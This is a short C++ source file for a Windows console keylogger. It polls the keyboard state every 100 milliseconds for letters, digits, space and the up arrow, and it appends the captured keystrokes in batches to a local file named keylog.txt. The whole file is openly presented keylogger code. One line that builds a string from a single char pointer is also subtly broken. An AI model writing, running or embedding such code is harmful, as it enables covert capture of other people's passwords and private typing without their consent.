// EffectiveKeylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"



#include <fstream>
#include <string>
#include <windows.h>

using namespace std;

//global variables
ofstream out;
string buffer;
int counter;
//global variables

//keylist prototype
void keylist(char key);
//keylist prototype

/***************Main****************/

int _tmain(int argc, _TCHAR* argv[])
{
	//array for every important character key
	char chType[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";


	//the while-loop to check the key state every 100 milliseconds
	while (1 == 1)
	{
		for (int i = 0; i<36; i++)
			keylist(chType[i]);

		if (GetAsyncKeyState(VK_SPACE))
		{
			buffer.append(" ");
			counter++;
		}

		if (GetAsyncKeyState(VK_UP))
		{
			buffer.append("\n");
			counter++;
		}
		//flush the string
		if (counter == 15)
		{
			out.open("keylog.txt", ios::app);
			out << buffer;
			buffer = "";
			out.close();
			counter = 0;
		}

		//every 100 ms
		Sleep(100);

	}
}

/***************Main****************/

//keylist function
void keylist(char key_)
{
	//check if the user presses a key
	if (GetAsyncKeyState(key_))
	{
		string skey(&key_);
		buffer.append(skey);
		counter++;

	}
}
//keylist function
